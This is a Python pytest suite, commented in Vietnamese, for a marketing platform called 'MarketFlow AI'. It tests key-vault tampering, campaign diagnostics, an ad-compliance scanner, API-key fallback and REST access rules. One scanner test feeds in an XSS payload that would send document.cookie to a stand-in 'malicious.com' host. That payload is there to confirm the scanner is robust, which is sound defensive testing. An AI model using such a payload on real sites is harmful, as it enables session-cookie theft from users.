"""MarketFlow AI — Tier 5 Adversarial Coverage Hardening Test Suite.
Milestone 7 Giai đoạn 2: White-Box Adversarial Stress Harness.

Bao gồm các bài kiểm thử đối kháng đa chiều:
1. Xâm nhập mật mã (Cryptographic Vault Penetration & Tamper Resistance)
2. Stress AI Doctor Diagnostic Engine (Negative numbers, zero division, organic/loss attribution)
3. Stress Compliance Guardrail (Massive payloads, XSS/injection, accent evasion, false-positive filters)
4. Multi-tier Key Resolver & Fallback Engine Failover (Hierarchy, timeouts, corrupt schema)
5. REST Endpoint Boundary & Tenant Isolation Protection (409 conflict, tamper safety, 400 compliance gate)
"""

import base64
import json
import time
import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
import httpx

from app.core.config import settings
from app.core.crypto import (
    get_fernet_cipher, encrypt_api_key, decrypt_api_key, mask_api_key
)
from app.models.entities import (
    User, CustomApiKey, Workspace, WorkspaceMember, BrandKit,
    Campaign, CampaignMetric, MarketingChannel, MarketingContent, AILog
)
from app.services.ai.ai_doctor import AIDoctorEngine
from app.services.compliance.compliance_service import ComplianceScanner, strip_accents
from app.services.ai.ai_service import AIService, ai_service
from app.schemas.schemas import AIDoctorResponse, ComplianceCheckResponse


# ==============================================================================
# Helper Functions & Fixtures
# ==============================================================================

def get_auth_token(client: TestClient, email: str = "manager@ictu.edu.vn", password: str = "Manager@123") -> dict:
    resp = client.post("/api/v1/auth/login", json={"email": email, "password": password})
    assert resp.status_code == 200, f"Login failed for {email}: {resp.text}"
    token = resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def manager_headers(client: TestClient) -> dict:
    return get_auth_token(client, "manager@ictu.edu.vn", "Manager@123")


@pytest.fixture
def marketer_headers(client: TestClient) -> dict:
    return get_auth_token(client, "marketer@ictu.edu.vn", "Marketer@123")


def create_test_campaign(db: Session, name: str = "Test Campaign", budget: float = 10000000.0) -> Campaign:
    """Tạo campaign thỏa mãn toàn bộ ràng buộc schema CSDL (product_id, objective, audience, start/end date)."""
    camp = Campaign(
        workspace_id=1,
        product_id=1,
        owner_id=1,
        name=name,
        objective="Tối ưu tỷ lệ chuyển đổi đa kênh với AI",
        audience="Khách hàng tiềm năng 22-35 tuổi",
        start_date="2026-09-01",
        end_date="2026-09-30",
        budget=budget,
        status="ACTIVE"
    )
    db.add(camp)
    db.commit()
    db.refresh(camp)
    return camp


# ==============================================================================
# 1. Cryptographic Vault Penetration & Tamper Resistance (FEAT-BE-23, crypto.py)
# ==============================================================================

class TestCryptoPenetrationTier5:
    """Kiểm thử đối kháng tầng mật mã Fernet + PBKDF2HMAC Vault."""

    def test_01_crypto_single_bit_flip_tampering_rejected(self):
        """Tấn công can thiệp 1 bit đơn lẻ trong payload Fernet: phải bị phát hiện và từ chối."""
        plain_key = "AIzaSyEmpiricalAdversarialKeyTest2026SecureVault"
        ciphertext = encrypt_api_key(plain_key)
        raw_bytes = bytearray(base64.urlsafe_b64decode(ciphertext.encode("utf-8")))

        # Lật 1 bit ở byte thứ 25 (trong khối IV/Ciphertext)
        raw_bytes[25] ^= 0x01
        tampered_ciphertext = base64.urlsafe_b64encode(bytes(raw_bytes)).decode("utf-8")

        with pytest.raises(ValueError, match="Tampered or invalid key"):
            decrypt_api_key(tampered_ciphertext)

    def test_02_crypto_fernet_version_header_tampering(self):
        """Can thiệp byte phiên bản Fernet (0x80) ở vị trí đầu tiên thành 0x81 hoặc 0x00."""
        plain_key = "AIzaSyHeaderTamperResistanceVerification"
        ciphertext = encrypt_api_key(plain_key)
        raw_bytes = bytearray(base64.urlsafe_b64decode(ciphertext.encode("utf-8")))

        assert raw_bytes[0] == 0x80  # Fernet standard magic byte
        raw_bytes[0] = 0x81  # Thay đổi phiên bản không được hỗ trợ
        tampered = base64.urlsafe_b64encode(bytes(raw_bytes)).decode("utf-8")

        with pytest.raises(ValueError, match="Tampered or invalid key"):
            decrypt_api_key(tampered)

    def test_03_crypto_timestamp_tampering_invalidates_hmac(self):
        """Can thiệp 8 bytes timestamp trong header Fernet: HMAC phải bắt được lỗi toàn vẹn."""
        plain_key = "AIzaSyTimestampIntegrityTestToken"
        ciphertext = encrypt_api_key(plain_key)
        raw_bytes = bytearray(base64.urlsafe_b64decode(ciphertext.encode("utf-8")))

        # Bytes 1 đến 8 là timestamp 64-bit int
        raw_bytes[4] ^= 0xFF
        tampered = base64.urlsafe_b64encode(bytes(raw_bytes)).decode("utf-8")

        with pytest.raises(ValueError, match="Tampered or invalid key"):
            decrypt_api_key(tampered)

    def test_04_crypto_hmac_truncation_or_corruption(self):
        """Cắt bớt hoặc can thiệp chữ ký HMAC-SHA256 ở cuối chuỗi Fernet."""
        plain_key = "AIzaSyHmacSignatureVerification2026"
        ciphertext = encrypt_api_key(plain_key)
        raw_bytes = bytearray(base64.urlsafe_b64decode(ciphertext.encode("utf-8")))

        # 32 bytes cuối cùng là HMAC
        raw_bytes[-1] ^= 0x55  # Lật bit ở byte HMAC cuối
        tampered = base64.urlsafe_b64encode(bytes(raw_bytes)).decode("utf-8")

        with pytest.raises(ValueError, match="Tampered or invalid key"):
            decrypt_api_key(tampered)

        # Cắt ngắn 10 bytes HMAC
        truncated = base64.urlsafe_b64encode(bytes(raw_bytes[:-10])).decode("utf-8")
        with pytest.raises(ValueError, match="Tampered or invalid key"):
            decrypt_api_key(truncated)

    def test_05_crypto_empty_whitespace_and_null_inputs(self):
        """Từ chối tuyệt đối khóa rỗng, chỉ gồm khoảng trắng, xuống dòng hoặc None."""
        with pytest.raises(ValueError):
            encrypt_api_key("")
        with pytest.raises(ValueError):
            encrypt_api_key("     ")
        with pytest.raises(ValueError):
            encrypt_api_key("\t\r\n")

        with pytest.raises(ValueError):
            decrypt_api_key("")
        with pytest.raises(ValueError):
            decrypt_api_key("   ")

    def test_06_crypto_garbage_and_corrupted_base64_strings(self):
        """Xử lý an toàn chuỗi không phải base64 hoặc chuỗi rác ngẫu nhiên: luôn ném ValueError."""
        garbage_inputs = [
            "!@#$%^&*()_+~`",
            "gAAAAAThisIsNotBase64!!!",
            "gAAAAAB" + ("A" * 30),
            "1234567890abcdef",
            " " * 100
        ]
        for bad_str in garbage_inputs:
            with pytest.raises(ValueError):
                decrypt_api_key(bad_str)

    def test_07_crypto_extreme_length_and_unicode_emojis(self):
        """Mã hóa và giải mã khóa cực dài (50,000 ký tự) chứa ký tự Unicode phức tạp và Emoji."""
        complex_text = "Khóa-Bảo-Mật-AI-2026-🇻🇳-🚀-🔥-🔑-Đột-Phá-Doanh-Số-" * 1000
        assert len(complex_text) > 40000

        ciphertext = encrypt_api_key(complex_text)
        assert ciphertext.startswith("gAAAAA")
        decrypted = decrypt_api_key(ciphertext)
        assert decrypted == complex_text

    def test_08_crypto_mask_api_key_boundary_ladder(self):
        """Kiểm thử bậc thang chiều dài đối với hàm che giấu mặt nạ mask_api_key."""
        # 1. Empty / None
        assert mask_api_key("") == ""
        assert mask_api_key(None) == ""

        # 2. Chiều dài < 4 ký tự -> trả về '...'
        assert mask_api_key("a") == "..."
        assert mask_api_key("ab") == "..."
        assert mask_api_key("abc") == "..."

        # 3. Chiều dài từ 4 đến 9 ký tự -> f"{clean[:2]}...{clean[-2:]}"
        assert mask_api_key("abcd") == "ab...cd"
        assert mask_api_key("123456789") == "12...89"

        # 4. Chiều dài >= 10 ký tự -> f"{clean[:6]}...{clean[-4:]}"
        assert mask_api_key("1234567890") == "123456...7890"
        long_key = "AIzaSyAdversarialVerificationToken9999"
        masked = mask_api_key(long_key)
        assert masked == "AIzaSy...9999"
        assert "..." in masked
        assert len(masked) == 13


# ==============================================================================
# 2. Stress AI Doctor Diagnostic Engine (FEAT-BE-21, ai_doctor.py)
# ==============================================================================

class TestAIDoctorStressTier5:
    """Kiểm thử áp lực và ca biên cho động cơ chẩn đoán AIDoctorEngine."""

    def test_09_ai_doctor_negative_metrics_db_and_engine_defense(self, db_session: Session):
        """Kiểm thử phòng thủ hai lớp đối với số liệu âm:
        Lớp 1: Ràng buộc CSDL (chk_cost_nonneg, chk_revenue_nonneg) ngăn chặn lưu số âm -> IntegrityError.
        Lớp 2: Nếu dữ liệu suy biến lọt vào bộ nhớ, AIDoctorEngine vẫn kẹp điểm an toàn [0, 100].
        """
        camp = create_test_campaign(db_session, name="Negative Value Stress Campaign", budget=10000000.0)

        # Lớp 1: CSDL CheckConstraint ngăn chặn ghi số âm
        neg_metric = CampaignMetric(
            campaign_id=camp.id,
            channel_id=1,
            metric_date="2026-09-01",
            views=1000,
            clicks=50,
            conversions=5,
            cost=-500000.0,
            revenue=1000000.0
        )
        db_session.add(neg_metric)
        with pytest.raises(Exception) as excinfo:
            db_session.commit()
        assert "CHECK constraint failed" in str(excinfo.value) or "chk_cost_nonneg" in str(excinfo.value)
        db_session.rollback()

        # Lớp 2: Kiểm thử tính bền bỉ của thuật toán AIDoctorEngine khi đối mặt với dữ liệu suy biến
        mock_metric = MagicMock(
            campaign_id=camp.id,
            channel_id=1,
            metric_date="2026-09-01",
            views=1000,
            clicks=50,
            conversions=5,
            cost=-500000.0,
            revenue=-200000.0
        )
        fake_db = MagicMock()
        fake_db.query.return_value.filter.return_value.first.return_value = camp
        fake_db.query.return_value.filter.return_value.all.return_value = [mock_metric]
        fake_db.query.return_value.all.return_value = []

        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=fake_db)
        assert isinstance(diag, AIDoctorResponse)
        assert 0 <= diag.health_score <= 100
        assert diag.health_status in ["HEALTHY", "NEEDS_ATTENTION", "CRITICAL"]

    def test_10_ai_doctor_channel_zero_cost_organic_viral_attribution(self, db_session: Session):
        """Kênh truyền thông có chi phí bằng 0 nhưng doanh thu lớn (Organic Viral): ROAS & Attribution không lỗi chia cho 0."""
        camp = create_test_campaign(db_session, name="Organic Viral Campaign", budget=5000000.0)

        # Kênh 1: Organic (Cost = 0, Revenue = 15,000,000)
        m1 = CampaignMetric(
            campaign_id=camp.id, channel_id=1, metric_date="2026-09-01",
            views=50000, clicks=2500, conversions=150, cost=0.0, revenue=15000000.0
        )
        # Kênh 2: Paid (Cost = 5,000,000, Revenue = 1,000,000 -> Lỗ)
        m2 = CampaignMetric(
            campaign_id=camp.id, channel_id=2, metric_date="2026-09-01",
            views=20000, clicks=800, conversions=20, cost=5000000.0, revenue=1000000.0
        )
        db_session.add_all([m1, m2])
        db_session.commit()

        attr = AIDoctorEngine.compute_channel_attribution(campaign_id=camp.id, db=db_session)
        assert len(attr) == 2
        ch1 = next(c for c in attr if c.channel_id == 1)
        ch2 = next(c for c in attr if c.channel_id == 2)

        # Ch1 có chi phí 0 -> share_of_cost = 0%, share_of_revenue = 93.75%
        assert ch1.cost == 0.0
        assert ch1.share_of_cost == 0.0
        assert ch1.share_of_revenue > 90.0

        # AI Doctor chẩn đoán
        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session)
        rec_actions = [r.action for r in diag.recommendations]
        # Kênh 1 xuất sắc được SCALE, Kênh 2 lỗ được REDUCE
        assert "SCALE" in rec_actions
        assert "REDUCE" in rec_actions

    def test_11_ai_doctor_heavy_spending_zero_revenue_critical(self, db_session: Session):
        """Chiến dịch chi tiêu ngân sách lớn nhưng không phát sinh doanh thu (ROAS = 0.0)."""
        camp = create_test_campaign(db_session, name="Money Drain Campaign", budget=50000000.0)

        m = CampaignMetric(
            campaign_id=camp.id, channel_id=1, metric_date="2026-09-02",
            views=100000, clicks=3000, conversions=0, cost=20000000.0, revenue=0.0
        )
        db_session.add(m)
        db_session.commit()

        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session)
        assert diag.health_status == "CRITICAL"
        assert diag.metrics_analyzed["roas"] == 0.0
        assert diag.metrics_analyzed["roi_percent"] == -100.0
        assert any("ROAS" in b or "lỗ" in b for b in diag.key_bottlenecks)

    def test_12_ai_doctor_zero_clicks_zero_conversions_clickbait_dud(self, db_session: Session):
        """Views cực lớn nhưng Clicks = 0 và Conversions = 0 (Clickbait Dud)."""
        camp = create_test_campaign(db_session, name="Zero Click Dud Campaign", budget=2000000.0)

        m = CampaignMetric(
            campaign_id=camp.id, channel_id=1, metric_date="2026-09-03",
            views=500000, clicks=0, conversions=0, cost=1000000.0, revenue=0.0
        )
        db_session.add(m)
        db_session.commit()

        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session)
        assert diag.metrics_analyzed["ctr_percent"] == 0.0
        assert diag.metrics_analyzed["cpc_avg"] == 0.0
        assert diag.metrics_analyzed["cvr_percent"] == 0.0
        assert diag.health_status == "CRITICAL"

    def test_13_ai_doctor_sparse_uninitialized_campaign(self, db_session: Session):
        """Chiến dịch mới tinh chưa có bất kỳ metric nào trong database."""
        camp = create_test_campaign(db_session, name="Brand New Empty Campaign", budget=1000000.0)

        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session)
        assert diag.is_sparse_data is True
        assert diag.health_score == 50
        assert diag.health_status == "HEALTHY"
        assert len(diag.channel_breakdown) == 0
        assert diag.recommendations[0].action == "SCALE"

    def test_14_ai_doctor_zero_views_zero_cost_row(self, db_session: Session):
        """Bản ghi metric tồn tại nhưng toàn bộ views = 0 và cost = 0 (Sparse data branch)."""
        camp = create_test_campaign(db_session, name="Zero Views Row Campaign", budget=500000.0)

        m = CampaignMetric(
            campaign_id=camp.id, channel_id=1, metric_date="2026-09-04",
            views=0, clicks=0, conversions=0, cost=0.0, revenue=0.0
        )
        db_session.add(m)
        db_session.commit()

        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session)
        assert diag.is_sparse_data is True
        assert diag.health_score == 50

    def test_15_ai_doctor_nonexistent_campaign_id(self, db_session: Session):
        """Truy vấn chẩn đoán một campaign_id không tồn tại (999999) trong CSDL."""
        diag = AIDoctorEngine.diagnose_campaign(campaign_id=999999, db=db_session)
        assert diag.campaign_id == 999999
        assert "Chiến dịch #999999" in diag.campaign_name
        assert diag.is_sparse_data is True

    def test_16_ai_doctor_audit_log_persistence_resilience(self, db_session: Session):
        """Đảm bảo _persist_log ghi dữ liệu nhật ký kiểm toán vào ai_logs thành công."""
        camp = create_test_campaign(db_session, name="Audit Log Test Campaign", budget=1000000.0)

        initial_logs_count = db_session.query(AILog).count()
        diag = AIDoctorEngine.diagnose_campaign(campaign_id=camp.id, db=db_session, current_user=None)
        db_session.commit()

        new_logs_count = db_session.query(AILog).count()
        assert new_logs_count == initial_logs_count + 1
        latest_log = db_session.query(AILog).order_by(AILog.id.desc()).first()
        assert latest_log.task_type == "SUMMARY"
        assert latest_log.provider == "gemini"
        assert latest_log.campaign_id == camp.id


# ==============================================================================
# 3. Stress Compliance Guardrail & Evasion Resistance (FEAT-BE-14, compliance_service.py)
# ==============================================================================

class TestComplianceGuardrailStressTier5:
    """Kiểm thử đối kháng bộ lọc tuân thủ chính sách quảng cáo và rào chắn thương hiệu."""

    def test_17_compliance_stress_massive_payload_with_buried_violation(self):
        """Chuỗi văn bản cực lớn (200,000 ký tự) có chứa từ cấm bị chôn sâu ở cuối."""
        padding = "Chào mừng bạn đến với chiến dịch tiếp thị số hiện đại của chúng tôi. " * 3000
        assert len(padding) > 180000
        poisoned_text = padding + " Chúng tôi cam kết 100% việc làm cho tất cả học viên tham gia."

        start_time = time.time()
        res = ComplianceScanner.scan(title="Chiến dịch quy mô lớn", body=poisoned_text)
        duration = time.time() - start_time

        # Kiểm tra hiệu năng xử lý văn bản lớn dưới 3 giây
        assert duration < 3.0
        assert res.status == "VIOLATION"
        assert res.can_submit is False
        assert any(v.severity == "HIGH" for v in res.violations)
        assert any("cam kết 100%" in v.word for v in res.violations)

    def test_18_compliance_xss_and_html_injection_resilience(self):
        """Nội dung chứa payload tấn công XSS và mã độc chèn mã HTML."""
        xss_title = "<script>alert('XSS-ATTACK');</script>"
        xss_body = "<img src=x onerror=this.src='http://malicious.com/?cookie='+document.cookie> Cam kết hoàn tiền ngay!"

        res = ComplianceScanner.scan(title=xss_title, body=xss_body)
        # Scanner không bị lỗi và vẫn quét chính xác các vi phạm quảng cáo
        assert res.status == "VIOLATION"
        assert any("cam kết hoàn tiền" in v.word for v in res.violations)

    def test_19_compliance_strip_accents_and_evasion_attempts(self):
        """Phát hiện các biến thể không dấu, NFD/NFC nhằm lách bộ lọc."""
        # 1. Không dấu của 'cam kết 100%'
        res1 = ComplianceScanner.scan(body="Khoa hoc nay cam ket 100% dau ra nhe cac ban")
        assert res1.status == "VIOLATION"
        assert any("cam kết 100%" in v.word for v in res1.violations)

        # 2. Không dấu của 'chữa dứt điểm'
        res2 = ComplianceScanner.scan(body="San pham giup chua dut diem mun sau 7 ngay")
        assert res2.status == "VIOLATION"
        assert any("chữa dứt điểm" in v.word for v in res2.violations)

        # 3. Không dấu của 'làm giàu nhanh'
        res3 = ComplianceScanner.scan(body="Bi quyet lam giau nhanh cung thi truong crypto")
        assert res3.status == "VIOLATION"
        assert any("làm giàu nhanh" in v.word for v in res3.violations)

    def test_20_compliance_false_positive_filters_extensive(self):
        """Stress-test 12 cụm từ an toàn thông dụng: tuyệt đối KHÔNG được báo vi phạm sai (0 False Positives)."""
        safe_phrases = [
            "Dịch vụ chăm sóc khách hàng tận tâm 24/7",
            "Đặc sản bánh pía Sóc Trăng thơm ngon",
            "Mẫu áo kẻ sọc phong cách vintage mùa hè",
            "Họa tiết sọc caro trẻ trung năng động",
            "Hình ảnh con sóc nhỏ chạy nhảy trong rừng",
            "Bộ phim hoạt hình sóc chuột vui nhộn",
            "Món dưa chuột sọc dưa giòn ngon",
            "Giải pháp xác thực đa cấp độ an toàn cao",
            "Hệ thống phân quyền đa cấp bậc doanh nghiệp",
            "Địa chỉ tại số 10 đường Trần Duy Hưng",
            "Đã ghi nhận hơn số 1.000 khách hàng tham gia",
            "Số 100 đơn hàng đầu tiên nhận quà tặng"
        ]
        for phrase in safe_phrases:
            res = ComplianceScanner.scan(title="Nội dung kiểm tra an toàn", body=phrase)
            assert res.status == "PASSED", f"False positive detected on phrase: '{phrase}' (got {res.violations})"
            assert res.score == 100
            assert len(res.violations) == 0
            assert res.can_submit is True

    def test_21_compliance_true_positive_subtle_breaches(self):
        """Phát hiện đồng thời nhiều vi phạm với các mức độ nghiêm trọng khác nhau trong 1 văn bản."""
        text = "Sản phẩm số 1 thị trường bán phá giá xả kho sập giá, cam kết hoàn tiền không lý do."
        res = ComplianceScanner.scan(body=text)
        assert res.status == "VIOLATION"
        assert res.can_submit is False
        assert res.score < 50

        violation_words = [v.word for v in res.violations]
        # Bắt 'số 1' (MEDIUM), 'bán phá giá' (MEDIUM), 'cam kết hoàn tiền' (HIGH), v.v.
        assert any(w in violation_words for w in ["số 1", "bán phá giá", "cam kết hoàn tiền"])

    def test_22_compliance_brand_kit_dynamic_banned_words(self, db_session: Session):
        """Nạp danh sách từ cấm tùy biến từ Brand Kit của Workspace (Multi-tenant Blacklist)."""
        # Tạo workspace và BrandKit mới
        ws = Workspace(name="Custom Brand Workspace", slug="custom-brand", owner_id=1, status="ACTIVE")
        db_session.add(ws)
        db_session.commit()
        db_session.refresh(ws)

        bk = BrandKit(
            workspace_id=ws.id,
            brand_name="SuperBrand",
            banned_keywords_json=json.dumps(["đối thủ X", "sản phẩm nhái", "hàng giả"])
        )
        db_session.add(bk)
        db_session.commit()

        res = ComplianceScanner.scan(
            body="Chúng tôi vượt trội hơn đối thủ X và không bán hàng giả.",
            workspace_id=ws.id,
            db=db_session
        )
        assert res.status == "VIOLATION"
        assert res.can_submit is False
        brand_banned = [v for v in res.violations if v.category == "BRAND_BANNED"]
        assert len(brand_banned) >= 2

    def test_23_compliance_empty_and_none_inputs(self):
        """Quét chuỗi rỗng hoặc toàn None: trả về PASSED điểm 100 an toàn."""
        res1 = ComplianceScanner.scan(title="", body="", cta="")
        assert res1.status == "PASSED"
        assert res1.score == 100

        res2 = ComplianceScanner.scan(title=None, body=None, cta=None)
        assert res2.status == "PASSED"
        assert res2.score == 100


# ==============================================================================
# 4. Multi-tier Key Resolver & Fallback Engine Failover (FEAT-BE-26, ai_service.py)
# ==============================================================================

class TestKeyResolverAndFallbackTier5:
    """Kiểm thử đối kháng cơ chế phân giải khóa 4 tầng và động cơ Smart Fallback."""

    def test_24_key_resolver_tier1_workspace_key_priority(self, db_session: Session):
        """Ưu tiên cao nhất là Workspace Custom Key khi nó active."""
        ws_key_plain = "AIzaSyWorkspaceSecretKeyTier1"
        ws_key = CustomApiKey(
            user_id=1,
            workspace_id=1,
            provider="gemini",
            encrypted_key=encrypt_api_key(ws_key_plain),
            model="gemini-2.5-pro",
            is_active=True
        )
        db_session.add(ws_key)
        db_session.commit()

        service = AIService()
        resolved = service.resolve_api_key(db=db_session, workspace_id=1, user_id=1)
        assert resolved["tier"] == "WORKSPACE"
        assert resolved["api_key"] == ws_key_plain
        assert resolved["model"] == "gemini-2.5-pro"

    def test_25_key_resolver_tier2_fallback_to_user_key(self, db_session: Session):
        """Khi Workspace Key bị tắt (inactive) hoặc hỏng, hệ thống tự lùi về User Personal Key."""
        # Workspace key inactive
        ws_key = CustomApiKey(
            user_id=1,
            workspace_id=1,
            provider="gemini",
            encrypted_key=encrypt_api_key("AIzaSyInactiveKey"),
            model="gemini-2.5-flash",
            is_active=False
        )
        # User personal key active
        user_key_plain = "AIzaSyUserPersonalSecretKeyTier2"
        user_key = CustomApiKey(
            user_id=1,
            workspace_id=None,
            provider="gemini",
            encrypted_key=encrypt_api_key(user_key_plain),
            model="gemini-2.5-flash",
            is_active=True
        )
        db_session.add_all([ws_key, user_key])
        db_session.commit()

        service = AIService()
        resolved = service.resolve_api_key(db=db_session, workspace_id=1, user_id=1)
        assert resolved["tier"] == "USER"
        assert resolved["api_key"] == user_key_plain

    def test_26_key_resolver_tier3_system_default_key(self, db_session: Session, monkeypatch):
        """Khi cả Workspace và User đều không có key, lùi về System Default Key."""
        monkeypatch.setenv("GEMINI_API_KEY", "AIzaSySystemDefaultEnvKey2026")
        service = AIService()
        resolved = service.resolve_api_key(db=db_session, workspace_id=999, user_id=999)
        assert resolved["tier"] == "SYSTEM"
        assert resolved["api_key"] == "AIzaSySystemDefaultEnvKey2026"

    def test_27_key_resolver_tier4_smart_fallback_when_no_keys(self, db_session: Session, monkeypatch):
        """Khi hoàn toàn không có bất kỳ API key nào, kích hoạt Smart Fallback Engine."""
        monkeypatch.delenv("GEMINI_API_KEY", raising=False)
        monkeypatch.setattr(settings, "AI_API_KEY", "")

        service = AIService()
        resolved = service.resolve_api_key(db=db_session, workspace_id=999, user_id=999)
        assert resolved["tier"] == "FALLBACK"
        assert resolved["api_key"] is None
        assert resolved["provider"] == "template-fallback-engine"

    def test_28_ai_service_network_timeout_failover_recovery(self, db_session: Session):
        """Khi nhà cung cấp AI gặp lỗi Timeout (mất kết nối mạng ngoại vi), tự động kích hoạt Smart Fallback."""
        service = AIService()
        service.fallback_enabled = True
        service.api_key = "AIzaSyDummyKeyForTimeoutTest"

        with patch.object(service, "_call_provider_with_retry", side_effect=httpx.TimeoutException("Network Timeout")):
            res = service.execute_task(
                db=db_session,
                user_id=1,
                campaign_id=1,
                task_type="idea_generation",
                task_code="IDEA",
                prompt_version="v1",
                context={"product_name": "AI Course", "product_usp": "Fast track"}
            )
            assert res["is_fallback"] is True
            assert res["model_provider"] == "template-fallback-engine"
            assert "ideas" in res
            assert len(res["ideas"]) >= 3
            assert any("Lỗi AI" in w or "Smart Fallback" in w for w in res.get("warnings", []))

    def test_29_ai_service_schema_corruption_recovery(self, db_session: Session):
        """Khi nhà cung cấp AI trả về JSON hỏng hoặc không đúng định dạng Pydantic schema."""
        service = AIService()
        service.fallback_enabled = True
        service.api_key = "AIzaSyDummyKeyForBadJsonTest"

        # Giả lập phản hồi trả về HTML thay vì JSON
        bad_response = "<html><head><title>502 Bad Gateway</title></head><body>Error</body></html>"
        with patch.object(service, "_call_provider_with_retry", return_value=bad_response):
            res = service.execute_task(
                db=db_session,
                user_id=1,
                campaign_id=1,
                task_type="content_draft",
                task_code="DRAFT",
                prompt_version="v1",
                context={"product_name": "CRM Pro", "product_usp": "Automation"}
            )
            assert res["is_fallback"] is True
            assert "title" in res
            assert "body" in res
            assert "cta" in res

    def test_30_ai_service_omnichannel_fallback_structure_integrity(self, db_session: Session, monkeypatch):
        """Kiểm tra tính toàn vẹn cấu trúc dữ liệu đa kênh của Fallback Engine (Facebook, TikTok, Email)."""
        monkeypatch.delenv("GEMINI_API_KEY", raising=False)
        monkeypatch.setattr(settings, "AI_API_KEY", "")

        service = AIService()
        service.fallback_enabled = True
        res = service.generate_omnichannel_content(
            db=db_session,
            user_id=1,
            campaign_id=1,
            prompt_version="v1",
            context={
                "brand_name": "MarketFlow AI",
                "product_name": "SaaS Platform",
                "usp": "Tăng trưởng chuyển đổi 300%",
                "brief": "Chiến dịch chào hè rực rỡ"
            }
        )
        assert res["is_fallback"] is True
        assert "facebook" in res
        assert "tiktok" in res
        assert "email" in res

        # TikTok phải có tối thiểu 3 scenes chuẩn kịch bản video dọc
        tiktok = res["tiktok"]
        assert "hook_3s" in tiktok
        assert len(tiktok["scenes"]) >= 3
        for sc in tiktok["scenes"]:
            assert "scene_number" in sc
            assert "visual" in sc
            assert "voiceover" in sc

        # Email phải có cả subject_line_a và subject_line_b cho A/B testing
        email = res["email"]
        assert "subject_line_a" in email
        assert "subject_line_b" in email
        assert "cta_button" in email


# ==============================================================================
# 5. REST Endpoint Boundary & Tenant Isolation Protection (API v1)
# ==============================================================================

class TestEndpointBoundaryAndSecurityTier5:
    """Kiểm thử đối kháng ranh giới API REST và cô lập người thuê (Tenant Isolation)."""

    def test_31_api_metric_duplicate_conflict_409(self, client: TestClient, manager_headers: dict):
        """Bảo vệ toàn vẹn dữ liệu: Cấm ghi đè metric trùng lặp (campaign, channel, metric_date) -> HTTP 409."""
        payload = {
            "campaign_id": 1,
            "channel_id": 1,
            "metric_date": "2026-09-15",
            "views": 1000,
            "clicks": 50,
            "conversions": 5,
            "cost": 250000.0,
            "revenue": 1000000.0
        }
        # Lần 1: Thành công tạo mới
        r1 = client.post("/api/v1/campaigns/1/metrics", json=payload, headers=manager_headers)
        assert r1.status_code == 201

        # Lần 2: Trùng lặp ngày và kênh -> Bắt buộc trả về HTTP 409 Conflict
        r2 = client.post("/api/v1/campaigns/1/metrics", json=payload, headers=manager_headers)
        assert r2.status_code == 409
        assert "đã tồn tại" in r2.json()["detail"]

    def test_32_api_settings_tampered_key_retrieval_safe_fallback(self, client: TestClient, manager_headers: dict, db_session: Session):
        """Khi ciphertext của API key trong CSDL bị can thiệp/hỏng, GET /settings/ai-keys không được sập 500."""
        # Can thiệp trực tiếp vào DB
        corrupt_key = CustomApiKey(
            user_id=1,
            workspace_id=None,
            provider="gemini",
            encrypted_key="gAAAAABCorruptedTamperedGarbageCiphertextData1234567890",
            model="gemini-2.5-flash",
            is_active=True
        )
        db_session.add(corrupt_key)
        db_session.commit()

        # Gọi API lấy danh sách key
        resp = client.get("/api/v1/settings/ai-keys", headers=manager_headers)
        assert resp.status_code == 200
        data = resp.json()
        # Mặt nạ an toàn được kích hoạt, hệ thống không bị crash
        assert data["masked_key"] == "AIzaSy...****"

    def test_33_api_content_submit_blocked_by_compliance_guardrail_400(self, client: TestClient, marketer_headers: dict, db_session: Session):
        """Cổng kiểm duyệt Compliance Guardrail: Ngăn chặn gửi duyệt bài viết vi phạm nghiêm trọng -> HTTP 400."""
        # Tạo bài viết nháp chứa từ cấm mức độ HIGH
        draft_content = MarketingContent(
            workspace_id=1,
            campaign_id=1,
            channel_id=1,
            created_by=2,  # Marketer
            title="Tuyệt chiêu kiếm tiền tỷ",
            body="Chúng tôi cam kết 100% việc làm và cam kết hoàn tiền không lý do.",
            cta="Bấm vào đây để làm giàu nhanh",
            status="DRAFT"
        )
        db_session.add(draft_content)
        db_session.commit()
        db_session.refresh(draft_content)

        # Gửi duyệt bài viết
        resp = client.post(f"/api/v1/contents/{draft_content.id}/submit", headers=marketer_headers)
        assert resp.status_code == 400
        assert "nghiêm trọng" in resp.json()["detail"]

        # Trạng thái trong DB vẫn phải là DRAFT chứ không được chuyển thành IN_REVIEW
        db_session.refresh(draft_content)
        assert draft_content.status == "DRAFT"

    def test_34_api_forbidden_direct_state_transition_to_approved_or_published(self, client: TestClient, marketer_headers: dict, db_session: Session):
        """Bảo vệ State Machine: Cấm Marketer tự tạo hoặc update bài viết trực tiếp lên APPROVED hoặc PUBLISHED."""
        # 1. Thử tạo mới trực tiếp ở trạng thái APPROVED -> HTTP 400
        create_payload = {
            "campaign_id": 1,
            "channel_id": 1,
            "title": "Bypass State Machine Title",
            "body": "Bypass State Machine Body",
            "status": "APPROVED"
        }
        r_create = client.post("/api/v1/contents", json=create_payload, headers=marketer_headers)
        assert r_create.status_code == 400

        # 2. Tạo draft hợp lệ
        create_payload["status"] = "DRAFT"
        r_draft = client.post("/api/v1/contents", json=create_payload, headers=marketer_headers)
        assert r_draft.status_code == 201
        content_id = r_draft.json()["id"]

        # 3. Thử update trực tiếp thành PUBLISHED -> HTTP 400
        r_update = client.put(f"/api/v1/contents/{content_id}", json={"status": "PUBLISHED"}, headers=marketer_headers)
        assert r_update.status_code == 400
